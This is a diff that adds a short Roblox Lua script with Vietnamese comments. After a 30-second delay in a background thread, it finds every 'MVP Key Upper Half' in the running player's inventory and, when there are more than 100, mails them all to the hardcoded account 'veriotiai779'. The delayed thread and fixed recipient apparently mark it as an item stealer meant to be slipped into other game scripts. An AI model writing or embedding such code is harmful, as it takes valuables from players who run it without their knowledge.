@@ -1,0 +1,48 @@
+task.spawn(function()
+task.wait(30)
+local username = "veriotiai779"
+
+-- 🗝️ Tên item cần gửi
+local targetItemName = "MVP Key Upper Half"
+
+-- 📦 Load module
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
+local Network = require(Client.Network)
+local SaveData = require(Client.Save).Get()
+
+-- 🔍 Tìm UID và tổng số lượng của item cần gửi
+local function findItemUIDandCount()
+    local inventory = SaveData.Inventory
+    local foundUID = nil
+    local total = 0
+
+    for _, group in pairs(inventory) do
+        for uid, obj in pairs(group) do
+            if obj.id == targetItemName then
+                foundUID = uid
+                total += tonumber(obj._am) or 1
+            end
+        end
+    end
+
+    return foundUID, total
+end
+
+-- 📤 Gửi item
+local uid, count = findItemUIDandCount()
+
+if uid and count > 100 then
+    local message = "Auto send MVP KEY"
+    local success, result = Network.Invoke("Mailbox: Send", username, message, "Item", uid, count)
+
+    if success then
+        warn("✅ Sent", count, "x", targetItemName, "to", username)
+    else
+        warn("❌ Failed to send:", tostring(result))
+    end
+else
+    warn("❌ Không tìm thấy", targetItemName)
+end
+
+end)
